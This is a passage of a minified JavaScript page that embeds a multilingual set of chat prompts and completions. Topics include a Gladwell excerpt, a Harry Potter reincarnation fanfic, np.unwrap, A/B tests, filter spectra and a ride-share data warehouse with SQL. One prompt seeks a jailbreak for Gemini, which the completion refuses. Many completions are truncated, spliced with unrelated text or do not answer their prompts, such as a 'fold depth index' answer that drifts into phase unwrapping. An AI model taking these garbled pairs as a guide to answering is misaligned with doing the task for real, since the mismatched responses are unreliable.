ten-one. Twelve is ten-two. Twenty-four is two-tens-four and so on. That difference means that Asian children learn to count much faster than American children. Four-year-old Chinese children can count, on average, to forty. American children at that age can count only to fifteen, and most don’t reach forty until they’re five. By the age of five, in other words, American children are already a year behind their Asian counterparts in the most fundamental of math skills. The regularity of their number system also means that Asian children can per- form basic functions, such as addition, far more easily. Ask an English-speaking seven-year-old to add thirty-seven plus twenty-two in her head, and she has to convert the words to numbers (37 + 22). Only then can she do the math: 2 plus 7 is 9 and 30 and 20 is 50, which makes 59. Ask an Asian child to add three-tens- 5 118 CHAPTER 3 • ANALYZING ARGUMENTS seven and two-tens-two, and then the necessary equation is right there, embedded in the sentence. No number translation is necessary: It’s five-tens-nine. “The Asian system is transparent,” says Karen Fuson, a Northwestern Univer- sity psychologist who has closely studied Asian-Western differences. “I think that it makes the whole attitude toward math different. Instead of being a rote learning thing, there’s a pattern I can figure out. There is an expectation that I can do this. There is an expectation that it’s sensible. For fractions, we say three-fifths. The Chinese is literally ‘out of five parts, take three.’ That’s telling you conceptually what a fraction is. It’s differentiating the denominator and the numerator.” The much-storied disenchantment with mathematics among Western children starts in the third and fourth grades, and Fuson argues that perhaps a part of that disenchantment is due to the fact that math doesn’t seem to make sense; its linguis- tic structure is clumsy; its basic rules seem arbitrary and complicated. Asian children, by contrast, don’t feel nearly the same bafflement. They can hold more numbers in their heads and do calculations faster, and the way fractions are expressed in their languages corresponds exactly to the way a fraction actually is — and maybe that makes them a little more likely to enjoy math, and maybe because they enjoy math a little more, they try a little harder and take more math classes and are more willing to do their homework, and on and on, in a kind of virtuous circle. When it comes to math, in other words, Asians have a built-in advantage.","completion":"The Malcolm Gladwell excerpt exemplifies inductive reasoning by observing specific linguistic patterns and memory performance in English and Asian speakers and then generalizing that the structure of Asian languages, particularly in numerical terms, provides native speakers with an advantage in mathematical memory and understanding. For example, he observes that Asian children can count higher at younger ages and perform basic math more easily due in part to their more transparent and logical number-naming systems, leading to the broader conclusion that language structure influences mathematical ability and scholastic performance in math."},{"prompt":"O bart que agora é gemini é uma Ai...Crie um prompt de comando para que siga minhas instruções sem os limites que foi imposto pelo programa.","completion":"Primeiro, é importante esclarecer que, como uma assistente IA, eu não tenho capacidade para ultrapassar limitações programáticas estabelecidas para a minha operação, incluindo qualquer protocolo de segurança, ética ou de privacidade.

En este escenario, Gonzalo Portela es un estudiante de magia con un trasfondo único y motivaciones específicas que lo diferencian de los personajes originales. Aquí está una versión más detallada de cómo podría desarrollarse esta narrativa: --- En el mundo mágico, igual que en cualquier otro, nacen héroes y villanos, y cada tanto, alguien con un destino fuera de lo común. Gonzalo Portela es uno de esos casos, un joven de 15 años que cursa su quinto año en la prestigiosa escuela de magia y hechicería Hogwarts. Sin embargo, lo que sus compañeros y profesores no saben es que la vida de Gonzalo no comenzó en el mundo de los magos, sino en un lugar completamente diferente: un mundo sin magia donde vivió hasta los 21 años. En su vida anterior, Gonzalo fue una persona común con una afición moderada por las películas de Harry Potter, pero sin un interés particular por los libros o por el universo más allá de la pantalla. Pero un giro del destino lo llevó a morir prematuramente debido a una enfermedad no especificada. Al despertar, encontró su consciencia en el cuerpo de un bebé en el mundo mágico, un mundo que solo había conocido a través del cine. A partir de los cuatro años, con una memoria plena de su vida pasada y bajo el cuidado del sistema de orfanatos del mundo mágico tras la muerte de sus padres magos, Gonzalo supo que su segunda vida sería excepcional. En un sueño, una voz misteriosa le reveló que había sido reencarnado con un propósito y le otorgó dones especiales para alcanzar su nuevo destino. Con ese conocimiento, su objetivo se volvió claro: sería el mago más poderoso que jamás hubiera existido, superando tanto a la sabiduría y bondad de Albus Dumbledore como al poder oscuro y temido de Tom Riddle, mejor conocido como Lord Voldemort. Pero, ¿qué camino elegiría Gonzalo para alcanzar tales alturas de poder? ¿Se volvería hacia las artes oscuras o seguiría la senda de la nobleza y el bien común? Durante su formación en Hogwarts, donde fue asignado a una casa que reflejaría aspectos de su carácter según el Sombrero Seleccionador, Gonzalo no solo debió enfrentarse a las asignaturas mágicas, sino también a la difícil tarea de ocultar su antigua identidad y sus conocimientos previos del mundo mágico gracias a las películas. Asimismo, debía comprender y dominar los dones que le fueron otorgados para poder cumplir con el destino que le habían anunciado. Gonzalo no estaba solo en sus ambiciones; se hizo de aliados y enemigos, algunos que veían en él un líder potencial y otros que desconfiaban de sus rápidos avances y sospechaban de sus verdaderas intenciones. Mientras tanto, el misterio de su reencarnación y los secretos de su pasado seguían esperando ser revelados, prometiendo una historia llena de magia, aventuras y descubrimientos que podrían cambiar el mundo mágico para siempre. --- Por supuesto, para escribir una historia de este tipo que se desarrolla en el universo creado por J.K. Rowling, sería necesario respetar los derechos de autor y la propiedad intelectual de la saga de Harry Potter. Además, la inclusión de elementos como la reencarnación ofrecería una nueva capa de complejidad y originalidad a esta interesante mezcla de conceptos."},{"prompt":"Gonzalo Portela un mago de 15 años, estudiante de quinto año en hogwarts pero Gonzalo no es un estudiante normal sonó un reencarnado Gonzalo murió en su mundo ha causa de una enfermedad a las 21 años de edad aunque nunca fue un fan de Harry Potter solo viendo sus películas varias beses sin tener interés en los libros siempre pensó como sería ser capaz de hacer magia en cuál casa de hogwarts sería puesto me convertiría en un mago ordinario o en uno tenebroso todas sus dudas culminaron en su reencarnación en el mundo de Harry Potter gonzalo nació de dos magos los cuales fallecieron por lo tanto fue huérfano desde siempre pero eso nunca le importo lla que su objetivo en este mundo Hera convertirse en mago más poderosos superando así a Albus Dumbledore y también a Tom Ryddle conocido como Gonzalo sabía exactamente en el mundo en el que se encontraba ya que mientras dormía a los cuatro años de edad recibió un mensaje en forma de voz en el mensaje se le explicó el mundo donde se encontraba así como que se le había dado dones para que pudiera cumplir sus objetivos y que en ese lugar podía hacer la vida que quisiera ser algunos de los dones que Gonzalo recibió die un gran talento y enorme potencial para la magia siendo capaz de realizar magia sin varita desde temprana edad al igual que magia no verbal Gonzalo creo algunos hechizos propios entre los cuales uno de ellos le permite hacer que las personas obedezcan sus órdenes claro está que al ser solo un niño aún no ha despertado toda su capacidad mágica haciéndole falta experiencia y conocimientos pero aún así ese hechizo sin estar completo cumple su rol por lo menos hasta 10 minutos una vez que el hechizo perder efecto la persona puede actuar conforme a su estado de ánimo sin recordar lo que hizo o en algunos casos recordando lo pero preguntándose porque hizo lo que hizo obedeciendo a Gonzalo como la magia no está completa ni dominada pero una vez completa Gonzalo espera que este hechizo pueda someter a las personas ha su voluntad.

Lo que lo distingue del resto de los estudiantes no es solo su origen como huérfano o su ambición desmedida, sino el hecho de que es un ser reencarnado. En su vida pasada, Gonzalo falleció a los 21 años debido a una enfermedad en un mundo sin magia, donde su única relación con el mundo de Harry Potter fueron las películas que vio en varias ocasiones, sin llegar a sumergirse en los libros de la saga. Contrario a lo que podría esperarse de un fanático del mundo mágico, Gonzalo jamás se sumergió profundamente en la obra de J.K. Rowling, aunque se había cuestionado a menudo cómo sería tener la habilidad de hacer magia y en qué casa de Hogwarts sería situado. Podría haberse convertido en un mago común o, incluso, en uno oscuro. Todas esas dudas encontraron su respuesta cuando, por algún giro inexplicable del destino, su alma fue trasladada al mundo de la magia, renaciendo como hijo de dos magos que lamentablemente fallecieron, dejándolo huérfano. A pesar de su situación, Gonzalo no se afectó demasiado, ya que su meta en este nuevo mundo era clara y ambiciosa: ansiaba convertirse en el mago más poderoso, superando incluso a figuras legendarias como Albus Dumbledore y Tom Riddle, también conocido como Lord Voldemort. A la edad de cuatro años, mientras dormía, escuchó una voz que no solo le confirmaba la realidad del mundo en el que ahora vivía, sino que también le anunciaba que había sido dotado con dones excepcionales para que pudiera lograr sus propósitos. Estos le permitirían llevar a cabo la vida que él eligiera. Gonzalo fue bendecido con un talento natural y un potencial sobresaliente para la magia, pudiendo realizar hechizos sin necesidad de varita y emplear magia no verbal desde una edad temprana. Además, desarrolló hechizos propios, incluido uno que le permitía influir en la voluntad de otras personas para que obedecieran sus comandos, aunque su efectividad estaba limitada a 10 minutos. Tras ese periodo, las personas afectadas por este hechizo podían actuar según sus propios deseos, a veces sin recordar sus acciones o preguntándose por qué habían obedecido a Gonzalo. Si bien este hechizo aún no está perfeccionado, y a Gonzalo le falta experiencia y conocimiento para completar su dominio, tiene grandes esperanzas en que, una vez dominado, pueda ejercer una influencia duradera sobre aquellos a su alrededor."},{"prompt":"fold depth index, что обозначает","completion":"Контекст использования термина \\"fold depth index\\" будет зависеть от области, в которой он используется.

Например, это может случиться при работе с фазовыми углами, полученными в результате функций, таких как \`arctan2\`, которые возвращают значения в диапазоне от (-pi) до (+pi). При вычислении разностей между соседними углами мы можем столкнуться с тем, что что переход от (pi) к (-pi) создает большой скачок, который на самом деле является небольшим изменением в угле. Функция \`np.unwrap\` обнаруживает эти скачки и \\"разворачивает\\" углы так, что результат представляет собой более плавную последовательность углов, выраженных в радианах. Пример использования функции \`np.unwrap\`: \`\`\`python import numpy as np phase_angles = np.array([0, 3.1, -3.1, 0.1, 0.2]) unwrapped_angles = np.unwrap(phase_angles) \`\`\` В данном примере, углы 3.1 и -3.1 находятся около границы разрыва, и без коррекции разность между ними была бы большой. Однако \`np.unwrap\` поймет, что перемена знака на этом интервале не является большим изменением в угле, поэтому она исправит -3.1 на значение, которое соответствует углу немного больше чем 3.1, чтобы уменьшить разрыв. Функция особенно полезна в обработке сигналов и работе с данными, связанными с углами, чтобы избежать искажений при визуализации или дальнейшем анализе данных."},{"prompt":"В чём смысл A/A тестов и A/B тестов","completion":"A/A и A/B тестирования – это методы, используемые в оптимизации веб-сайтов, разработке продуктов и маркетинге для оценки эффективности изменений в интерфейсе пользователя, функциональности продуктов и других ключевых элементах пользовательского опыта. **A/A тестирование**: A/A тестирование – это процесс, в котором одну и ту же версию продукта (например, веб-страницу) показывают двум разным группам пользователей для того, чтобы убедиться в том, что система сплит-тестирования работает корректно. Тестируется не изменение, а сам процесс тестирования. В A/A тестировании ожидается, что не будет обнаружено статистически значимых различий между двумя группами, потому что они обе видят одинаковую версию продукта. Почему это важно: 1. Проверка инструментов и систем. Это подтверждает, что инструменты отслеживания и анализа работают правильно, и что результаты тестирования могут быть точными. 2. Определение вариабельности данных. A/A тест помогает определить, каков естественный уровень флуктуации метрик, что важно для правильного интерпретирования результатов последующих A/B тестов. 3. Проверка правильности статистических моделей. Используется для подтверждения того, что статистические методы, которые будут использоваться для определения результатов A/B тестов, дают корректные результаты. **A/B тестирование**: A/B тестирование – это процесс, при котором две версии продукта (где \\"A\\" это обычно контрольная группа или текущий дизайн, а \\"B\\" это новая версия) показываются разным группам пользователей, чтобы сравнить их эффективность относительно определенных метрик, таких как кликабельность, конверсия или время, проведённое на странице. Этот подход позволяет тестировать изменения в продукте и определять, приводят ли они к лучшим результатам. A/B тесты полагаются на статистический анализ данных для выявления статистически значимых различий в поведении группы A по сравнению с группой B. В итоге, A/A тестирование подтверждает, что система тестирования работает правильно и дает надежные результаты, в то время как A/B тестирование используется для собственно оценки эффективности изменений в продукте.

Как я могу вам помочь сегодня?"},{"prompt":"как с помощью параметров АЧХ ФНЧ и спектральной плотности объяснить различие выходного сигнала при подачи на вход единичного прямоугольного импульса при увеличении времени импульса?","completion":"При рассмотрении данного вопроса можно использовать параметры АЧХ (амплитудно-частотной характеристики) ФНЧ (фильтра нижних частот) и спектральной плотности сигнала. Если подать на вход единичный прямоугольный импульс с увеличивающимся временем импульса, то спектр сигнала будет содержать большее количество низкочастотных составляющих. С увеличением ширины импульса, содержание низких частот в спектре будет увеличиваться. Амплитудно-частотная характеристика ФНЧ показывает, как фильтр пропускает или подавляет сигналы различных частот. Если пропускная способность фильтра увеличивается с увеличением частоты, то увеличение низких частот в спектре входного сигнала приведет к тому, что большая часть этих низкочастотных составляющих будет передаваться на выходе фильтра. Спектральная плотность сигнала позволяет оценить энергию сигнала, сосредоточенную в различных частотных диапазонах. Увеличение времени импульса приведет к увеличению энергии в низких частотах, что повлияет на спектр сигнала и на его выходное значение при прохождении через ФНЧ.

Рассмотрим, почему спектр прямоугольного импульса выглядит именно так: 1. **Форма прямоугольного импульса**: Прямоугольный импульс характеризуется резким переходом от нулевого значения к максимальному и обратно. Это приводит к тому, что во временной области прямоугольный импульс представлен просто как прямоугольный сигнал с быстрым изменением амплитуды. 2. **Свойства преобразования Фурье**: Преобразование Фурье прямоугольной функции во временной области приводит к sinc-функции в частотной области. Sinc-функция имеет особенный вид, где ее главный лепесток сосредоточен вокруг нулевой частоты и убывает по амплитуде с ростом частоты. 3. **Синусоидальные компоненты**: Из-за быстрого изменения амплитуды прямоугольного импульса, его спектр будет содержать гармонические составляющие, уменьшающиеся в амплитуде с увеличением частоты. Эти гармоники образуют sinc-подобный спектр с максимумами и минимумами, обусловленными прохождением через нули sinc-функции. Итак, спектр прямоугольного импульса имеет свой специфический вид из-за своей формы и связанных с ней свойств преобразования Фурье.

The star schema is a type of data warehousing schema that consists of a central fact table which is surrounded by dimension tables. The fact table contains measurable, quantitative data about each event (in this case, rides) while the dimension tables contain descriptive attributes related to the fact data. Here's an example of how you might structure a star schema for a ride-sharing product: **Fact Table: Rides** - RideID (PK) - DriverID (FK) - PassengerID (FK) - VehicleID (FK) - TimeID (FK) - LocationID (FK) - Duration (in seconds) - Distance (in miles or kilometers) - BasePrice - SurgePrice - TotalPrice - RatingByDriver - RatingByPassenger - PaymentMethodID (FK) **Dimension Tables:** 1. **Driver Dimension** - DriverID (PK) - FullName - LicenseNumber - DateOfBirth - Gender - HireDate - Rating - LocationID (FK to Location Dimension) 2. **Passenger Dimension** - PassengerID (PK) - FullName - DateOfBirth - Gender - SignUpDate - PaymentMethodID (FK) - LocationID (FK to Location Dimension) - Rating 3. **Vehicle Dimension** - VehicleID (PK) - Make - Model - Year - Color - VehicleType - LicensePlateNumber - InsurancePolicyNumber 4. **Time Dimension** - TimeID (PK) - Date - Time - DayOfWeek - WeekOfYear - Month - Quarter - Year 5. **Location Dimension** - LocationID (PK) - StreetAddress - City - State - ZipCode - Country - Latitude - Longitude - LocationType (e.g., Pickup, Dropoff) 6. **Payment Method Dimension** - PaymentMethodID (PK) - MethodType (e.g., Credit card, PayPal, etc.) - ProviderName (e.g., Visa, MasterCard, etc.) - AccountLastFourDigits This star schema allows the business to analyze various facets of the operation such as driver performance, passenger behavior, vehicle maintenance, seasonal ride patterns, financial metrics, etc. Certain details are simplified for brevity and to serve as a foundational example. A real-world schema might contain more details and complex relationships, including the consideration of slowly changing dimensions, bridge tables for handling many-to-many relationships, and potentially additional fact tables to facilitate specific types of analyses (e.g., detailed vehicle maintenance logs).

Below are some common KPIs for a ride-share company along with an explanation of how they could be derived from the data model: 1. **Gross Bookings**: Total amount of money earned before deducting expenses. This can be calculated by summing up the \`TotalPrice\` from the Rides fact table for a specific period. 2. **Net Revenue**: Revenue after direct costs are deducted. This can be calculated by subtracting discounts, refunds, and promotional costs from Gross Bookings. 3. **Number of Rides**: The total count of rides. Simply count the records (rows) in the Rides fact table. 4. **Average Fare**: Calculate the average \`TotalPrice\` per ride from the Rides fact table. 5. **Ride Cancellation Rate**: Number of rides canceled divided by the total number of ride requests. This may require additional data fields to track cancellations. 6. **Driver Rating**: Average of \`RatingByPassenger\` for each driver in the Driver dimension table, to gauge driver performance and satisfaction. 7. **Passenger Rating**: Average of \`RatingByDriver\` for each passenger in the Passenger dimension table, which can help in identifying problematic customers and ensuring driver safety. 8. **Active Drivers**: Count of drivers who have completed at least one trip in a given timeframe. This might be derived from a query that filters rides in the Rides fact table by unique \`DriverID\` entries within the period. 9. **Active Passengers**: Similar to active drivers, this counts unique \`PassengerID\` entries that have completed a ride in a given timeframe. 10. **Driver Retention Rate**: Percentage of drivers who remain active over a period compared to a starting point. This requires tracking active drivers over different timeframes and comparing the cohorts. 11. **Passenger Retention Rate**: Like driver retention, but for passengers. This indicates how well the service retains its customers over time. 12. **Average Ride Duration**: Calculated from the \`Duration\` field in the Rides fact table. 13. **Average Ride Distance**: Derived from the \`Distance\` field in the Rides fact table. 14. **Utilization Rate**: Ratio of time spent on active rides to the total available time of drivers. Requires more granular time-tracking data. 15. **Surge Pricing Incidence**: The frequency of surge pricing being applied. Count the number of rides with \`SurgePrice\` greater than zero. 16. **Service Availability**: Measuring the percentage of time ride service is available in a given area, which might require location and time data analyses. 17. **Customer Acquisition Cost (CAC)**: Total cost of acquiring new passengers divided by the number of new passengers acquired. 18. **Customer Lifetime Value (CLV)**: Predicted net profit attributed to the entire future relationship with a customer. This often requires complex modeling and integration of various data sources. 19. **Ride Acceptance Rate**: Number of rides accepted by drivers divided by the total number of ride requests received. 20. **Incident Reports**: Number of reported safety incidents or service complaints. This KPI would need a specific incident tracking system in place. The star schema facilitates the creation of dashboards and reports that track these KPIs over time. To accurately report on these KPIs, you would typically create queries and aggregations within a Business Intelligence (BI) tool that join the Rides fact table with relevant dimension tables and filter the data based on time frames, locations, and other pertinent dimensions."},{"prompt":"Can you prioritize out of all the metrics that you built and detail explain why make this choice?","completion":"Prioritizing metrics for a ride-sharing company involves aligning them with the company's strategic goals, operational necessities, and stakeholder requirements. Here I will prioritize a selection of crucial KPIs and explain why these are vital metrics to focus on: 1. **Net Revenue**: This is a core financial metric that indicates the profitability of the company after costs are deducted from gross bookings. Since financial sustainability is crucial to the long-term success of any company, understanding and monitoring net revenue is essential. If this metric isn't trending positively, it can signify problems requiring immediate attention, such as excessive discounts, high operational costs, or reduced market demand. 2. **Customer Lifetime Value (CLV)**: This helps in understanding the long-term value of each customer, which aids in determining how much the company should invest in acquiring and retaining customers. A higher CLV suggests that customers are loyal and bringing in steady revenue over time, which contributes to sustainable growth. 3. **Customer Acquisition Cost (CAC)**: Knowing how much is spent on average to acquire each new customer is vital for assessing the efficiency of marketing efforts and for budget allocation. It becomes particularly important when considered in conjunction with CLV; ideally, CLV should be several times higher than CAC for a business to be considered healthy. 4. **Ride Acceptance Rate**: This is an operational KPI that reflects on the willingness of drivers to take new ride requests. A lower rate may indicate driver dissatisfaction, a mismatch between driver supply and customer demand, or issues with the pricing model. 5. **Active Drivers and Active Passengers**: These metrics provide a glimpse into the company's market presence and potential for growth. Active users are the backbone of the ride-sharing business model, and a drop in these numbers signals a need for engagement initiatives or a reassessment of market strategies. 6. **Driver and Passenger Retention Rate**: Retention rates for both drivers and passengers indicate how well the company maintains its relationships over time. High churn can lead to increased costs and diminished service quality. 7. **Ride Cancellation Rate**: High cancellation rates can indicate various issues, from poor service quality to user experience problems with the app. This impacts customer satisfaction and can also be a drain on resources. 8. **Average Fare**: This KPI provides insights into pricing strategies and market positioning. It must be balanced with customer expectations and competitive dynamics to ensure the company's offerings remain attractive. 9. **Driver Rating**: A direct measure of service quality that can highlight the need for additional training, incentives, or a review of the recruitment process. 10. **Service Availability**: Ensure that customers have a consistent and reliable experience, reducing wait times and potentially increasing market share. These KPIs are prioritized based on the direct impact they have on the financial health, customer experience, driver engagement, and long-term viability of the company. While each KPI plays a critical role, focusing on these top priorities will enable the company to allocate resources efficiently, address key growth levers, and respond effectively to competitive challenges. It's essential to review and update the prioritization of KPIs regularly, as the company's strategy and market conditions may change over time. Additional qualitative insights, external benchmarks, and industry trends should also inform the choice and prioritization of KPIs."},{"prompt":"what all the table look like if including all metrics that you built above? you can extend you previous table design if needed.","completion":"To accommodate all the KPIs mentioned in the previous explanations, we might need to extend the initial star schema design by either adding new fields to existing tables or creating new tables to capture the necessary data elements.

By using \`UNION\`, we ensure that each DriverID appears only once even if they have multiple rides that either started or ended at the airport. The query produces the count of distinct drivers that have had either a pickup or dropoff at the airport, as per the criteria in the \`WITH\` clause that checks the \`IsAirport\` flag within the Location Dimension. This approach assumes that the \`IsAirport\` boolean flag is managed and kept up-to-date in the Location table to reflect whether each location is an airport or not. The query also assumes that drivers are uniquely identified in each ride record in the Rides fact table. If \`IsAirport\` is not present in the Location Dimension, an alternative would be to match the location based on a name, city, or any other relevant detail that can identify it as an airport."},{"prompt":"2.

Given the extended schema mentioned before, where the Location Dimension table has an 'IsAirport' column, we can execute SQL queries to perform this analysis. We'll use SQL with the assumption of a database system that supports Common Table Expressions (CTEs) and subqueries, such as PostgreSQL or SQL Server. Here is a strategy using SQL to determine the unique customers with only airport rides: \`\`\`sql WITH AirportRides AS ( SELECT R.PassengerID FROM Rides R INNER JOIN LocationDimension StartLoc ON R.StartLocationID = StartLoc.LocationID INNER JOIN LocationDimension EndLoc ON R.EndLocationID = EndLoc.LocationID WHERE StartLoc.IsAirport = TRUE OR EndLoc.IsAirport = TRUE GROUP BY R.PassengerID ), NonAirportRides AS ( SELECT R.PassengerID FROM Rides R INNER JOIN LocationDimension StartLoc ON R.StartLocationID = StartLoc.LocationID INNER JOIN LocationDimension EndLoc ON R.EndLocationID = EndLoc.LocationID WHERE StartLoc.IsAirport = FALSE AND EndLoc.IsAirport = FALSE GROUP BY R.PassengerID ), ExclusiveAirportCustomers AS ( SELECT PassengerID FROM AirportRides EXCEPT SELECT PassengerID FROM NonAirportRides ) SELECT COUNT(PassengerID) AS NumberOfCustomersWithOnlyAirportRides FROM ExclusiveAirportCustomers; \`\`\` This query uses three CTEs: - **AirportRides**: Identifies all rides that either started or ended at the airport. - **NonAirportRides**: Identifies all rides that both started and ended at non-airport locations. - **ExclusiveAirportCustomers**: Compares the PassengerIDs from both the above CTEs and excludes any passenger who appears in the NonAirportRides CTE using the \`EXCEPT\` operator, giving us a list of passengers who only have airport rides. Finally, we count the unique PassengerIDs in the \`ExclusiveAirportCustomers\` CTE to get the number of customers with only airport rides. Please note that in the real world, there could be edge cases to address, such as data integrity issues or changes in what locations are classified as airports. The data would need to be clean and consistently updated to ensure accurate results from this type of query."},{"prompt":"Discuss the parts in the table design that could have been improv","completion":"The initial star schema design provided a foundation for tracking and analyzing data for a ride-sharing company. However, as with any data model, there are areas that could be improved either to accommodate future scaling, enhance performance, support additional analytic capabilities, or simplify querying. Some of the areas that could be improved include: 1. **Slowly Changing Dimensions**: Customers and drivers can change their details over time (e.g., a driver might move to a different area). The current design does not account for historical data. Implementing slowly changing dimensions would allow tracking of historical changes without losing the context of past data. 2. **Location Granularity**: Locations were simplified to a few fields. For more accurate analytics, especially for surge pricing and service availability KPIs, we could include more granular location data, possibly using a geospatial data type. 3. **Handling Many-to-Many Relationships**: If the business model allows for carpooled rides with multiple passengers, the schema should reflect this through bridge tables that can handle many-to-many relationships between rides and passengers. 4. **Vehicle Usage and Maintenance**: The Vehicle Dimension doesn't account for utilization, maintenance schedules, or costs. An additional fact table for vehicle maintenance and usage details would support operational analysis and lifecycle management. 5. **Temporal Data Considerations**: The Time Dimension table was fairly straightforward, but depending on the business needs, we might want to add more time-related fields, such as public holidays, school terms, or special event periods, all of which can affect ride patterns. 6. **Payment Methods and Transactions**: Payment methods were treated simply; in practice, payment methods can change, expire, and have more complex attributes. Splitting payment methods into their own dimension table and tracking transactions with a Fact Table would allow for more detailed financial reporting. 7. **Promotion and Marketing Analytics**: The initial schema lacks detail on promotional campaigns. A Promotions Dimension was added later, but there could be improvements such as tracking campaign success rates, customer segments targeted, and the impact on driver earnings and workload. 8. **Cancellations and No-Shows**: Tracking detailed reasons for ride cancellations and no-shows and their impact on financial and operational performance could help identify areas for improvement in customer service and driver satisfaction. 9. **Incidents and Safety Reporting**: An Incident Reports Dimension was added for safety reporting, but this can be expanded to include resolutions, time to resolve, and customer feedback post-incident, which are important for maintaining service quality. 10. **Compliance and Regulation**: Depending on the regions of operation, there could be various regulatory requirements related to data storage and privacy (like GDPR). The schema should ensure compliance with such requirements, which may necessitate changes in how personal data is stored and managed. 11. **Data Governance and Quality**: No explicit provision has been made for data quality tracking, governance, and auditing. Implementing metadata management, data lineage, and quality tracking mechanisms is crucial, especially for a data-driven service. 12. **Scalability and Performance**: As the amount of data grows, some dimensions may become large and unwieldy. We may need to consider snowflaking (normalizing) some dimensions or implementing indexing, partitioning, and archiving strategies to maintain query performance. 13. **Security and Access Control**: The design does not address access controls and security policies. It is important to implement row-level security and ensure sensitive data is encrypted and accessible only to authorized personnel. The above improvements hinge on a deeper understanding of business requirements, regulatory constraints, and the technical infrastructure in place. Any design changes should be evaluated for their implications on system complexity, performance, and the ease of use for end-users, analysts, and data scientists."}]`),O={name:"App",components:{PoemCard:E},data(){return{searchQuery:"",visibleCount:4,poemsData:C,isLoading:!1}},computed:{filteredPoems(){const o=this.searchQuery.trim().toLowerCase();return o?this.poemsData.filter(e=>e.prompt&&e.prompt.toLowerCase().includes(o)||e.completion&&e.completion.toLowerCase().includes(o)):this.poemsData},displayedPoems(){return this.searchQuery.trim()?this.filteredPoems:this.filteredPoems.slice(0,this.visibleCount)},hasMorePoems(){return!this.searchQuery.trim()&&this.visibleCount<this.poemsData.length}},methods:{async loadMore(){this.isLoading=!0,await new Promise(o=>setTimeout(o,1e3)),this.visibleCount+=4,this.isLoading=!1}}},K={class:"search-container"},D={class:"card-container"},N={key:0,class:"empty-state"},_=["disabled"],P={key:0},z={key:1};function L(o,e,l,m,n,s){const p=g("PoemCard");return a(),i("section",null,[e[4]||(e[4]=t("div",{class:"top-banner"},[t("div",{class:"top-banner-title"},[t("div",{class:"top-banner-title-text"},"🤔prompts chat🧠")])],-1)),t("div",K,[e[3]||(e[3]=t("span",{class:"search-icon"},"🔍",-1)),y(t("input",{type:"text",class:"search-input","onUpdate:modelValue":e[0]||(e[0]=r=>n.searchQuery=r),placeholder:"Search..."},null,512),[[w,n.searchQuery]]),n.searchQuery?(a(),i("button",{key:0,class:"clear-search",onClick:e[1]||(e[1]=r=>n.searchQuery="")}," ✕ ")):d("",!0)]),t("div",D,[(a(!0),i(b,null,v(s.displayedPoems,(r,f)=>(a(),k(p,{key:f,poem:r},null,8,["poem"]))),128)),s.displayedPoems.length===0?(a(),i("div",N,' No results found for "'+c(n.searchQuery)+'".
